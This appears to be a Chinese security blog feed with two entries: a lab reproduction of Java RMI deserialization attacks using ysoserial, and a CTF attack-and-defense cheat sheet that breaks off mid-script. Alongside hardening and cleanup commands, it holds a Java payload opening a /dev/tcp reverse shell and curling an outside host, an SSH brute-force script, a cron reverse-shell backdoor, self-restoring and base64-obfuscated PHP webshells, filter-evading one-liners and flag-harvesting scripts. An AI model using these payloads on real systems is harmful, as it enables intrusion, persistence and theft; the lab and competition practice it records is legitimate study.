String[]&#123;"bash","-c","bash -i &gt;&amp; /dev/tcp/172.20.10.1/4444 0&gt;&amp;1"&#125;); Runtime.getRuntime().exec("curl xx.xx.xx.xx:8000/exp"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125; public void lookup() throws Exception &#123; ICalc r = (ICalc) Naming.lookup("rmi://xx.xx.xx.xx:1099/refObj"); List&lt;Integer&gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); &#125; public static void main(String[] args) throws Exception &#123; new RMIClient().lookup(); &#125;&#125;// xx.xx.xx.xx 替换成云服务器地址 编译 1javac RMIClient.java 会得到两个文件RMIClient$Payload.class 和 RMIClient.class 然后将这两个文件上传至云服务器，用python3 -m http.server 启动一个http服务器进行监听。 1234ubuntu@VM-0-12-ubuntu:~/Temp$ ls RMIClient.class 'RMIClient$Payload.class'ubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 之所以这样做是因为正常执行的时候，我们可以通过-Djava.rmi.server.codebase=http://xx.xx.xx.xx/控制codebase 而这个codebase有什么作用呢？ P神说的 既然这个Java系列的文章要尽量全面地梳理Java知识，我们不妨将时间线拉的久远一些……曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如： 123&gt; &lt;applet code="HelloWorld.class" codebase="Applets" width="800" height="600"&gt;&gt; &lt;/applet&gt;&gt; 除了Applet，RMI中也存在远程加载的场景，也会涉及到codebase。 codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。 如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 http://example.com/org/vulhub/example/Example.class ，并作为Example类的字节码。 RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。 这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？ 对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。 接下来使用一个正常的客户端进行连接 12345678910111213141516171819202122import java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123; public class Payload extends ArrayList&lt;Integer&gt; &#123; &#125; public void lookup() throws Exception &#123; ICalc r = (ICalc) Naming.lookup("rmi://xx.xx.xx.xx:1099/refObj"); List&lt;Integer&gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); &#125; public static void main(String[] args) throws Exception &#123; new RMIClient().lookup(); &#125;&#125; 先编译 12javac RMIClient.javajava -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient 这里的 http://example.com/ 就是刚刚python监听的地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061F:\Code\JAVA\RMI2\src&gt;javac RMIClient.javaF:\Code\JAVA\RMI2\src&gt;java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://xx.xx.xx.xx:8000/ RMIClientException in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1 at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389) at sun.rmi.transport.Transport$1.run(Transport.java:200) at sun.rmi.transport.Transport$1.run(Transport.java:197) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:196) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275) at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252) at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161) at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:194) at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:148) at com.sun.proxy.$Proxy0.sum(Unknown Source) at RMIClient.lookup(RMIClient.java:16) at RMIClient.main(RMIClient.java:20)Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1 at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:348) at sun.rmi.transport.Transport$1.run(Transport.java:200) at sun.rmi.transport.Transport$1.run(Transport.java:197) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:196) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)Caused by: java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1 at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699) at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1885) at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2042) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573) at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2287) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2211) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2069) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431) at sun.rmi.server.UnicastRef.unmarshalValue(UnicastRef.java:322) at sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(UnicastServerRef.java:629) at sun.rmi.server.UnicastServerRef.unmarshalParameters(UnicastServerRef.java:617) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:338) ... 12 more 可以看到这里报了很多错误，但是没有关系，因为我们的命令已经成功执行。 看看刚刚python监听的日志 123456ubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /RMIClient$Payload.class HTTP/1.1" 200 -121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /RMIClient.class HTTP/1.1" 200 -121.4.65.44 - - [06/Nov/2021 12:11:43] code 404, message File not found121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /exp HTTP/1.1" 404 - 这里不仅读取了RMIClient$Payload.class和RMIClient.class文件，还请求了/exp ，说明成功执行了命令。 复现完成。 以下复现主要学习ysoserial工具的使用 Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)搭建环境https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/ 12docker-compose builddocker-compose run -e RMIIP=your-ip -p 1099:1099 rmi 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/12 : FROM maven:3-jdk-8 AS builder ---&gt; cf7c6bc6ea12Step 2/12 : LABEL MAINTAINER="phithon &lt;root@leavesongs.com&gt;" ---&gt; Using cache ---&gt; 828f56e5b565Step 3/12 : COPY ./src/code/ /usr/src/ ---&gt; Using cache ---&gt; 004e82609029Step 4/12 : WORKDIR /usr/src ---&gt; Using cache ---&gt; c9f14a7aef0fStep 5/12 : RUN cd /usr/src; mvn -U clean package -Dmaven.test.skip=true --settings settings.xml ---&gt; Using cache ---&gt; 27cbdf63515cStep 6/12 : FROM openjdk:8u111-jre ---&gt; e44d62cf8862Step 7/12 : WORKDIR /root ---&gt; Using cache ---&gt; 313347366d80Step 8/12 : ENV RMIIP="127.0.0.1" ---&gt; Using cache ---&gt; 90e0b68b0433Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar ---&gt; Using cache ---&gt; be0e1ec1469dStep 10/12 : COPY src/client.policy /root/ ---&gt; Using cache ---&gt; 9baa04a82cb7Step 11/12 : EXPOSE 1099 ---&gt; Using cache ---&gt; eb629a8ecc8aStep 12/12 : CMD ["bash", "-c", "java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server"] ---&gt; Using cache ---&gt; 77e422e51645Successfully built 77e422e51645Successfully tagged rmi-registry-bind-deserialization_rmi:latestroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/12 : FROM maven:3-jdk-8 AS builder ---&gt; cf7c6bc6ea12Step 2/12 : LABEL MAINTAINER="phithon &lt;root@leavesongs.com&gt;" ---&gt; Using cache ---&gt; 828f56e5b565Step 3/12 : COPY ./src/code/ /usr/src/ ---&gt; Using cache ---&gt; 004e82609029Step 4/12 : WORKDIR /usr/src ---&gt; Using cache ---&gt; c9f14a7aef0fStep 5/12 : RUN cd /usr/src; mvn -U clean package -Dmaven.test.skip=true --settings settings.xml ---&gt; Using cache ---&gt; 27cbdf63515cStep 6/12 : FROM openjdk:8u111-jre ---&gt; e44d62cf8862Step 7/12 : WORKDIR /root ---&gt; Using cache ---&gt; 313347366d80Step 8/12 : ENV RMIIP="127.0.0.1" ---&gt; Using cache ---&gt; 90e0b68b0433Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar ---&gt; Using cache ---&gt; be0e1ec1469dStep 10/12 : COPY src/client.policy /root/ ---&gt; Using cache ---&gt; 9baa04a82cb7Step 11/12 : EXPOSE 1099 ---&gt; Using cache ---&gt; eb629a8ecc8aStep 12/12 : CMD ["bash", "-c", "java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server"] ---&gt; Using cache ---&gt; 77e422e51645Successfully built 77e422e51645Successfully tagged rmi-registry-bind-deserialization_rmi:latest 12345root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 rmi/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendCreating network "rmi-registry-bind-deserialization_default" with the default driverHello obj bound 利用1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445F:\Tools\WEB\Java-Tools&gt; java -cp ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.RMIRegistryExploit xx.xx.xx.xx 1099 CommonsCollections6 "curl http://xx.xx.xx.xx:8000/exp"java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:421) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272) at sun.rmi.transport.Transport$1.run(Transport.java:200) at sun.rmi.transport.Transport$1.run(Transport.java:197) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:196) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:276) at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:253) at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:379) at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source) at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77) at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71) at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72) at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71) at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)Caused by: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:287) at sun.rmi.registry.RegistryImpl.bind(RegistryImpl.java:179) at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source) at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:411) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272) at sun.rmi.transport.Transport$1.run(Transport.java:200) at sun.rmi.transport.Transport$1.run(Transport.java:197) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:196) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 成功执行 123Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...121.4.65.44 - - [06/Nov/2021 14:20:15] code 404, message File not found121.4.65.44 - - [06/Nov/2021 14:20:15] &quot;GET /exp HTTP/1.1&quot; 404 - 小结本来是想多复现几个场景的，但是由于环境原因，实现起来比较复杂，我的目的就只是练习使用ysoserial工具，就懒得搞了，而且耽误时间并且意义也不大，那么学习java反序列就告一段落，这只是刚刚开始，后边还会陆陆续续进行学习。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>java安全漫谈</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-AWD攻防方法总结]]></title>
    <url>%2F2021%2F11%2F01%2FCTF-AWD%E6%94%BB%E9%98%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[防守&amp;加固 靶机加固的前提：需要知道靶机的密码和权限 root权限可以做所有操作 web权限：只能加固web服务，mysql服务等 不知道靶机密码的情况hydra爆破（kali自带） 123SSH 破解hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh python脚本爆破（需要安装paramiko库） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import sys, time, argparseimport paramikoclass ssh_brute(object): def __init__(self, host, port): self.host = host self.port = port def connect(self, host, port, username, password): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) try: ssh.connect(hostname=host, port=port, username=username, password=str(password), timeout=0.01) ssh.close() except: print("The password:&#123;password&#125; error!".format(password=password)) ssh.close() return print("find it!\nusername:\033[1;32;40m&#123;username&#125; \npassword:&#123;password&#125;\033[0m".format(username=username, password=password)) exit() def getpassword(self): dict = "C:/Users/root/Desktop/dic.txt" #×ÖµäÂ·¾¶ with open(dict) as f: password = f.readlines() return password def main(self): host = self.host port = self.port username = "root" password = self.getpassword() print("[+]host:&#123;host&#125;".format(host=host)) print("[+]username:&#123;username&#125;".format(username=username)) for paw in password: paw = paw.strip("\n") self.connect(host, port, username, paw)def parse(): parse = argparse.ArgumentParser("a ssh brute force crack") parse.add_argument("-host", dest="host", default="10.20.60.13", help="This is to set ip") parse.add_argument("-port", dest="port", default="22", help="This is to set port default:22") args = parse.parse_args() return args.host, args.portdef main(): #host, port = parse() //ÃüÁîÐÐ½âÎö host = '172.20.101.101' port = '22' ssh_brute(host, port).main()if __name__ == '__main__': main() kali自带字典目录 1/usr/share/wordlists 可能会用到的操作ssh提供rsa公私钥连接方式1ssh -i 私钥位置 user@hostname 查看有那些用户1cat /etc/passwd | grep /bin/bash 可查看端口对应服务1cat /etc/service 查看开了哪些端口 是否存在后门1netstat -anp 1netstat -anp|grep &quot;LISTEN&quot; 查看nc对应的进程和端口（其他程序同理，如：bash、python、php等反弹shell） 1netstat -nlpta|grep -w nc 查看nc进程树 1ps aux|grep -w nc 根据pid查找程序绝对路径 1ls -l /proc/2765/ | grep -w exe 也可以用 lsof -p pid 命令 1lsof -p pid 按照关掉端口的方式杀掉即可 关闭端口的方式1 . 强制关闭 1kill -9 端口号 监控日志命令1tail -f *.log scp实现ssh服务上传下载文件上传 1scp [-P 端口] 本地文件路径 user@host:远程文件路径 下载 1scp [-P 端口] user@host:远程文件路径 本地文件路径 备份网站目录打包网站 备份到/tmp目录下 备份到其他目录可能会因为没有权限而报错 1tar -czvf /tmp/html.tar.gz /var/www/html 根据备份的源码恢复网站123cd /tmptar -xzvf html.tar.gzmv /tmp/var/www/html/* /var/www/html/ 查找后门1find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&apos; 查找flag的位置12345使用`find / -name *flag*` 或`grep -rn &quot;flag&quot; *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分 修改flag文件权限和设置不可更改修改权限 1chmod 400 /root/flag 设置不可更改属性 1chattr +i /root/flag 克制不死马 强行kill掉进程后重启服务（不建议） 1ps -aux|grep ‘www-data’|awk ‘&#123;print $2&#125;’|xargs kill -9 写脚本不断删除 12345678910111213&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '.3.php'; // 这里修改成不死马文件名 $code = 'hi springbird !'; //pass=pass while (1)&#123; file_put_contents($file,$code); // usleep(5000); usleep(1000); &#125;?&gt; 干掉反弹shellps -ef / px -aux 出现www-data权限的/bin/sh一般为nc 如果有一些进程杀不掉可以尝试www-data权限去杀 kill.php 123&lt;?phpsystem("kill `ps -aux | grep www-data | grep apache2 | awk '&#123;print $2&#125;'`");?&gt; 从浏览器访问，就是www-data权限 建议连着kill两次 加固 方向：更改口令、加固服务、清除后门、备份重要文件、移动系统命令、清楚执行命令的历史记录 上靶机，改ssh密码，看端口，根据对应端口做加固操作，无关紧要的端口统统关闭。定时任务一定要看。 更改ssh登录密码1passwd 更改vnc登录密码（没有的情况下不用）1vncpasswd root 加固web服务器方法php网站加固 第一种：上waf 一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题 waf脚本网上搜集 waf的使用方式 方式一：可以使用 bash 命令在每一个 php 文件前面加上 require_once 包含 WAF 文件 传入的waf文件记得赋予可读可写入权限，不然不能生成文件 12# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once "/tmp/waf.php";?&gt;find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o -type f -name '*.php'|xargs sed -i '1i&lt;?php require_once "/tmp/waf.php";?&gt;' 1find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g" 方式二：修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限 123; Automatically add files before PHP document.; http://php.net/auto-prepend-fileauto_prepend_file = /tmp/waf.php 第二种：删除web服务器中存在漏洞页面 单个字符查找（） 123grep -rn &quot;相关函数名&quot; --include *.php /var/www/html--include *.php 指定php路径 多字符查找 1grep -E -rn &quot;字符串1|字符串2|字符串3|&quot; 文件名 一条命令批量加固php代码 1sed -i &quot;s/原字符串/新字符串/g&quot; `grep 原字符串 --include=*.php -rl 所在目录` 注释所有关键函数 注释include需注意，可能会导致网站加载不出来 12sed -i "s/eval/evaleval/g" `grep eval -rl --include=*.php /var/www/html`sed -i "s/system/systemsystem/g" `grep system -rl --include=*.php /var/www/html` 注释掉入口 123456789101112sed -i "s/_GET/GET/g" `grep _GET -rl --include=*.php /var/www/html`sed -i "s/_POST/POST/g" `grep _POST -rl --include=*.php /var/www/html`sed -i "s/_REQUEST/REQUEST/g" `grep _REQUEST -rl --include=*.php /var/www/html`sed -i "s/_FILES/FILES/g" `grep _FILES -rl --include=*.php /var/www/html`sed -i "s/_SERVER/SERVER/g" `grep _SERVER -rl --include=*.php /var/www/html`还原sed -i "s/GET/_GET/g" `grep GET -rl --include=*.php /var/www/html`sed -i "s/POST/_POST/g" `grep POST -rl --include=*.php /var/www/html`sed -i "s/REQUEST/_REQUEST/g" `grep REQUEST -rl --include=*.php /var/www/html`sed -i "s/FILES/_FILES/g" `grep FILES -rl --include=*.php /var/www/html`sed -i "s/SERVER/_SERVER/g" `grep SERVER -rl --include=*.php /var/www/html` 命令执行漏洞函数 12345678system()popen()passthru()(需要加echo 才能显示结果)exec()shell_exec() ecntl_exec()proc_open() 代码执行函数 12345678910eval()assert()preg_replace()create_function()array_map()call_user_func()call_user_func_array()array_filter()usort()uasort() 文件包含函数 1234include()include_once()require()require_once() 文件读取 123456789file_get_contents()fopen()fread()fgets()fgetss()readfile()parse_ini_file()show_source()highlight_file() 文件上传函数 1move_uploaded_file 文件删除 12unlink()session_destroy() 变量覆盖 1234extract()parse_str()import_request_variables()foreach() sql注入 1mysqli 其他危险函数 123copy unserialize()` 第三种：删站&amp;赋予不可访问权限 简单粗暴，直接让对手访问不了，但是可能会被裁判服务器check，导致扣分。 删除网站 1rm -rf /var/www/html/* 赋予网站目录 000 权限 1chmod 000 /var/www/html 重启网页服务器 1service apache2 restart JSP网站加固 12request upload 12sed -i "s/request/requestrequest/g" `grep request -rl --include=*.php /var/www/html`sed -i "s/upload/uploadupload/g" `grep upload -rl --include=*.php /var/www/html` Asp加固 12RequestHttpContext 12sed -i "s/Request/RequestRequest/g" `grep Request -rl --include=*.php /var/www/html`sed -i "s/HttpContext/HttpContextHttpContext/g" `grep HttpContext -rl --include=*.php /var/www/html` 加固数据库更改数据库密码第一种方法 1234567mysql -u root -p [默认密码]use mysql;更改密码update user set password = password(&quot;yangfan&quot;) where User = &apos;root&apos;;刷新权限flush privileges;exit 第二种方法 12update user set password = password(&quot;yangfan&quot;) where user = &apos;root&apos;;flush privileges; mysql 5.7 修改密码 1update mysql.user set authentication_string=password(&apos;123qwe&apos;) where user=&apos;root&apos; and Host = &apos;localhost&apos;; mysql数据库开启远程连接 123use mysql;update user set host=&apos;%&apos; where host=&apos;localhost&apos;;flush privileges; mysql数据关闭远程连接 123use mysql;update use set host=&apos;localhost&apos; where host=&apos;%&apos;;flush privileges; 加固ftp服务修改登录密码 1passwd ftpuser 关闭不需要的服务和守护进程123/etc/init.d/vsftpd stop /etc/init.d/smb stop /etc/init.d/sendmail stop 查看守护进程（如果有的话） 123cd /etc/xinetd.d/ ls rm -rf xx 开启内存地址随机化（防止pwn程序的利用）1echo 2 &gt; /proc/sys/kernel/randomize_va_space // 0是关闭，1是半随机，2是全随机 自启动相关禁用启动项 开机自启动 chkconfig 命令开启 1chkconfig 服务名 on 关闭 1chkconfig 服务名 off 防火墙iptables 命令 定时任务1234crontable-e 编辑crontab 的工作内容-l 查阅crontab 的工作内容-r 删除所有的crontab工作内容 cat 一次性输入全部内容（在纯linux 下 不能查看前面的内容）more 仅能向前移动，却不能向后移动less 用来查看一页不能完全显示的文件空格 向下翻页n 向上翻页 移动系统命令（最后的大招）将 /bin，/sbin，/usr/bin 下的全部程序移走，即使攻击者突破了前面的防守但是拿到shell后发现并不能执行系统命令，从而拿不到咱们的flag 123456789101112131415161718mkdir /etc/tmp cd /etc/tmp mkdir b mkdir sb mkdir ub cp /bin/* /etc/tmp/b cp /sbin/* /etc/tmp/sb cp /usr/bin/* /etc/tmp/ub cd /etc/tmp/b ./rm -rf /bin/* ./rm -rf /sbin/* ./rm -rf /usr/bin/* cd /etc/tmp/b history -c # 禁用cd 命令enable -n cd enable -n echo enable -n history 把系统命令移走后，清空历史命令记录然后将cd等内建命令禁用 攻击权限维持/后门技术定时任务反弹shell在/etc/networkt下写入反弹shell 123vim /etc/networkt写入bash -i &gt;&amp; /dev/tcp/LHOST/PROT 0&gt;&amp;1 赋予执行权限 1chmod +x /etc/networkt 写入/etc/crontab 或者 crontab -e 1*/1 * * * * root /etc/networkt 不死马123456789101112 &lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = './.index.php'; $code = '&lt;?php if(md5($_POST["pass"])=="361a8e7255c308e4362fff2ca3e726ff")&#123;@eval($_POST[a]);&#125; ?&gt;'; while (1)&#123; file_put_contents($file,$code); usleep(5000); &#125;?&gt; 1//马儿用法：POST::?pass=fany&amp;a=command 123&lt;?php file_put_contents('.1ndex.php',base64_decode('PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='));?&gt; 123get：pass=ocean888@.cnpost：cmd=system(“ls”); linux命令不死马1while true;do echo &apos;&lt;?php eval($_POST[&quot;x&quot;]);?&gt;&apos; &gt; x.php;sleep 1;done 过盾一句话1&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);print_r(`$a`)?&gt; 可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用 123&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k);?&gt;$a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k); 批量GETflag方法模板 1234567891011121314151617181920212223242526272829import requestimport redef getFlag(url): resp = request.get(url) flag = re.search(flag匹配规则, resp.text) return flagdef main(): # ip池 ipList = [100,101,102] # payload payload = '' # flag存储 flagList = [] # 遍历 try: for i in ipList: url = "192.168.1."+str(i)+payload flag = getFlag(url) print(url, flag) flagList.append(flag) except: pass print(flagList)if __name__ == '__main__': main() 核心的两句话 12res = request.get(url+payload)flag = re.findall(r"flag&#123;.+&#125;", res.text) 批量获取提交flag脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import requestsimport reimport time# 请求def request(url): print(url) resp = requests.get(url) return resp.text# 获取flagdef getFlag(html): flag = 